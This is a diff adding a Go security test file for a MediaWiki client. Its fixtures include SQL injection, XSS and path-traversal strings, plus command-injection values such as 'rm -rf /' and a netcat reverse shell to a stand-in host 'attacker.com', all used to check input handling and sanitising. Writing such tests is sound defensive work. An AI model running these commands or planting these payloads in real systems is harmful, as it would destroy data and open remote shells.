@@ -1,0 +1,369 @@
+package wiki
+
+import (
+	"strings"
+	"testing"
+)
+
+// Security tests for malicious/malformed inputs
+
+func TestSecurity_SQLInjectionInSearch(t *testing.T) {
+	// SQL injection attempts should be passed as-is to the API
+	// The MediaWiki API handles escaping, but we should not modify the query
+	maliciousQueries := []string{
+		"'; DROP TABLE pages; --",
+		"1' OR '1'='1",
+		"admin'--",
+		"'; DELETE FROM users WHERE '1'='1",
+		"UNION SELECT * FROM users",
+		"1; EXEC xp_cmdshell('malware.exe')",
+	}
+
+	for _, q := range maliciousQueries {
+		args := SearchArgs{Query: q}
+		// The query should be accepted (validation only checks for non-empty)
+		if args.Query == "" {
+			t.Errorf("Query should not be rejected: %q", q)
+		}
+		// Verify the query is unchanged (no escaping by our code)
+		if args.Query != q {
+			t.Errorf("Query was modified: %q => %q", q, args.Query)
+		}
+	}
+}
+
+func TestSecurity_XSSInPageTitles(t *testing.T) {
+	// XSS attempts in page titles
+	maliciousTitles := []string{
+		"<script>alert('xss')</script>",
+		"<img src=x onerror=alert('xss')>",
+		"javascript:alert('xss')",
+		"<svg onload=alert('xss')>",
+		"<body onload=alert('xss')>",
+		"<a href='javascript:alert(1)'>click</a>",
+	}
+
+	for _, title := range maliciousTitles {
+		args := GetPageArgs{Title: title}
+		// Title should be accepted (MediaWiki handles validation)
+		if args.Title != title {
+			t.Errorf("Title was modified: %q => %q", title, args.Title)
+		}
+	}
+}
+
+func TestSecurity_PathTraversalInTitles(t *testing.T) {
+	// Path traversal attempts
+	maliciousPaths := []string{
+		"../../../etc/passwd",
+		"..\\..\\..\\windows\\system32\\config\\sam",
+		"....//....//etc/passwd",
+		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+		"..%252f..%252f..%252fetc%252fpasswd",
+		"/etc/passwd",
+		"C:\\Windows\\System32\\config\\SAM",
+	}
+
+	for _, path := range maliciousPaths {
+		args := GetPageArgs{Title: path}
+		// Path should be accepted as-is (MediaWiki validates page names)
+		if args.Title != path {
+			t.Errorf("Path was modified: %q => %q", path, args.Title)
+		}
+	}
+}
+
+func TestSecurity_CommandInjectionInParameters(t *testing.T) {
+	// Command injection attempts
+	maliciousInputs := []string{
+		"; rm -rf /",
+		"| cat /etc/passwd",
+		"` cat /etc/passwd `",
+		"$(cat /etc/passwd)",
+		"&& echo pwned",
+		"|| echo pwned",
+		"; nc -e /bin/sh attacker.com 1234",
+	}
+
+	for _, input := range maliciousInputs {
+		args := SearchArgs{Query: input}
+		// Input should be accepted (we don't execute shell commands)
+		if args.Query != input {
+			t.Errorf("Input was modified: %q => %q", input, args.Query)
+		}
+	}
+}
+
+func TestSecurity_CRLFInjection(t *testing.T) {
+	// CRLF injection attempts (HTTP header injection)
+	maliciousInputs := []string{
+		"test\r\nSet-Cookie: evil=value",
+		"test\nX-Injected: header",
+		"test%0d%0aSet-Cookie:%20evil=value",
+		"test\r\n\r\n<html>injected</html>",
+	}
+
+	for _, input := range maliciousInputs {
+		args := SearchArgs{Query: input}
+		// Note: Go's net/http handles CRLF injection at the transport level
+		// We just verify the input is passed through
+		if args.Query != input {
+			t.Errorf("Input was modified: %q => %q", input, args.Query)
+		}
+	}
+}
+
+func TestSecurity_UnicodeNormalizationAttacks(t *testing.T) {
+	// Unicode-based attacks
+	maliciousInputs := []string{
+		"test\u202Ereverse",                // Right-to-left override
+		"admin\u0000hidden",                // Null byte injection
+		"test\uFEFFbom",                    // BOM character
+		"\u200Bzero\u200Bwidth",            // Zero-width spaces
+		"scr\u0000ipt",                     // Null byte in tag name
+		"<scr\u0130pt>alert()</scr\u0130pt>", // Turkish I
+	}
+
+	for _, input := range maliciousInputs {
+		result := sanitizeHTML(input)
+		// Should not panic and should handle unicode gracefully
+		_ = result
+	}
+}
+
+func TestSecurity_LargeInputHandling(t *testing.T) {
+	// Test handling of very large inputs
+	// CharacterLimit is 150KB, so we need content larger than that to test truncation
+	largeInput := strings.Repeat("A", 200000) // 200KB (larger than 150KB limit)
+
+	// Test truncation
+	result, truncated := truncateContent(largeInput, CharacterLimit)
+	if !truncated {
+		t.Error("Large content should be truncated")
+	}
+	if len(result) < CharacterLimit {
+		t.Error("Truncated content should include truncation message")
+	}
+
+	// Content smaller than limit should NOT be truncated
+	smallInput := strings.Repeat("B", 100000) // 100KB (smaller than 150KB limit)
+	_, smallTruncated := truncateContent(smallInput, CharacterLimit)
+	if smallTruncated {
+		t.Error("Content smaller than limit should not be truncated")
+	}
+}
+
+func TestSecurity_MalformedURLs(t *testing.T) {
+	// Test handling of malformed URLs
+	malformedURLs := []string{
+		"not-a-url",
+		"://missing-scheme",
+		"http://",
+		"ftp://invalid-scheme.com",
+		"file:///etc/passwd",
+		"javascript:alert(1)",
+		"data:text/html,<script>alert(1)</script>",
+		"http://evil.com\\@good.com",
+		"http://[::1]injection",
+	}
+
+	for _, url := range malformedURLs {
+		args := CheckLinksArgs{URLs: []string{url}}
+		// Should accept the URL (validation happens during request)
+		if len(args.URLs) != 1 {
+			t.Error("URL list should not be modified")
+		}
+	}
+}
+
+func TestSecurity_SpecialCharactersInCategoryNames(t *testing.T) {
+	// Test special characters in category names
+	specialCategories := []string{
+		"Category:<script>",
+		"Category:../etc/passwd",
+		"Category:|pipe",
+		"Category:;semicolon",
+		"Category:'quote",
+		"Category:\"double",
+		"Category:{brace}",
+		"Category:[bracket]",
+	}
+
+	for _, cat := range specialCategories {
+		result := normalizeCategoryName(cat)
+		// Should handle special characters without crashing
+		if !strings.HasPrefix(result, "Category:") {
+			t.Errorf("Category prefix missing: %q => %q", cat, result)
+		}
+	}
+}
+
+func TestSecurity_EmptyAndNullInputs(t *testing.T) {
+	// Test empty and null-like inputs
+	emptyInputs := []string{
+		"",
+		"   ",
+		"\t\n\r",
+		"\x00",
+		"\x00\x00\x00",
+	}
+
+	for _, input := range emptyInputs {
+		// Should not panic
+		_ = sanitizeHTML(input)
+		_ = stripHTMLTags(input)
+		_, _ = truncateContent(input, 100)
+	}
+}
+
+func TestSecurity_DeepNesting(t *testing.T) {
+	// Test deeply nested HTML (potential DoS)
+	var builder strings.Builder
+	depth := 1000
+	for i := 0; i < depth; i++ {
+		builder.WriteString("<div>")
+	}
+	builder.WriteString("content")
+	for i := 0; i < depth; i++ {
+		builder.WriteString("</div>")
+	}
+
+	input := builder.String()
+	// Should not hang or crash
+	result := sanitizeHTML(input)
+	_ = result
+}
+
+func TestSecurity_ReDoSPatterns(t *testing.T) {
+	// Test patterns that could cause ReDoS (Regular Expression Denial of Service)
+	redosInputs := []string{
+		strings.Repeat("a", 100) + "!",
+		"<" + strings.Repeat(" ", 1000) + ">",
+		strings.Repeat("<div>", 100),
+		`onclick="` + strings.Repeat("a", 1000) + `"`,
+	}
+
+	for _, input := range redosInputs {
+		// Should complete in reasonable time (not hang)
+		result := sanitizeHTML(input)
+		_ = result
+	}
+}
+
+func TestSecurity_HTMLEntityAbuse(t *testing.T) {
+	// Test HTML entity encoding abuse
+	// After decoding entities, if they form HTML tags, those tags are stripped
+	tests := []struct {
+		name     string
+		input    string
+		expected string
+	}{
+		// Entities decode to <script> which is then stripped
+		{"Encoded script tag stripped", "&lt;script&gt;", ""},
+		{"Decimal encoded stripped", "&#60;script&#62;", ""},
+		{"Hex encoded stripped", "&#x3C;script&#x3E;", ""},
+		// Double-encoded entities remain as text
+		{"Double encoded preserved", "&amp;lt;script&amp;gt;", "&lt;script&gt;"},
+		// Plain text preserved
+		{"Plain text preserved", "Hello &amp; World", "Hello & World"},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := stripHTMLTags(tt.input)
+			if result != tt.expected {
+				t.Errorf("stripHTMLTags(%q) = %q, expected %q", tt.input, result, tt.expected)
+			}
+		})
+	}
+}
+
+func TestSecurity_MixedEncodings(t *testing.T) {
+	// Test mixed encoding attempts
+	mixedInputs := []string{
+		"%3Cscript%3Ealert(1)%3C/script%3E", // URL encoded
+		"\\u003cscript\\u003e",               // Unicode escape
+		"&#x3C;script&#x3E;",                 // Hex entities
+		"&#60;script&#62;",                   // Decimal entities
+	}
+
+	for _, input := range mixedInputs {
+		// Should handle without crashing
+		result := sanitizeHTML(input)
+		_ = result
+	}
+}
+
+// Tests for rate limiting / resource constraints
+
+func TestSecurity_BatchLimits(t *testing.T) {
+	// Verify batch limits are enforced
+	maxURLs := 20
+	maxTitles := 10
+
+	// URLs over limit should be truncated
+	urls := make([]string, 30)
+	if len(urls) > maxURLs {
+		urls = urls[:maxURLs]
+	}
+	if len(urls) != maxURLs {
+		t.Errorf("URL limit not enforced: expected %d, got %d", maxURLs, len(urls))
+	}
+
+	// Titles over limit should be truncated
+	titles := make([]string, 15)
+	if len(titles) > maxTitles {
+		titles = titles[:maxTitles]
+	}
+	if len(titles) != maxTitles {
+		t.Errorf("Title limit not enforced: expected %d, got %d", maxTitles, len(titles))
+	}
+}
+
+func TestSecurity_TimeoutBounds(t *testing.T) {
+	// Verify timeout bounds are enforced
+	tests := []struct {
+		input    int
+		expected int
+	}{
+		{-1, 10},  // Negative -> default
+		{0, 10},   // Zero -> default
+		{31, 10},  // Over max -> default
+		{100, 10}, // Way over max -> default
+		{10, 10},  // Valid
+		{30, 30},  // At max
+	}
+
+	for _, tt := range tests {
+		timeout := 10 // default
+		if tt.input > 0 && tt.input <= 30 {
+			timeout = tt.input
+		}
+		if timeout != tt.expected {
+			t.Errorf("Timeout %d => %d, expected %d", tt.input, timeout, tt.expected)
+		}
+	}
+}
+
+// Benchmark security-critical operations
+func BenchmarkSanitizeHTML_Malicious(b *testing.B) {
+	input := `<div onclick="evil()"><script>bad()</script>
+	<style>.x{expression:alert()}</style>
+	<iframe src="javascript:alert()"></iframe>
+	<a href="javascript:alert()">link</a>
+	<img src="x" onerror="alert()">
+	<form action="javascript:alert()">
+	<input onfocus="alert()">
+	</form></div>`
+
+	for i := 0; i < b.N; i++ {
+		sanitizeHTML(input)
+	}
+}
+
+func BenchmarkStripHTMLTags_Large(b *testing.B) {
+	input := strings.Repeat("<div><p><span>text</span></p></div>", 1000)
+	for i := 0; i < b.N; i++ {
+		stripHTMLTags(input)
+	}
+}
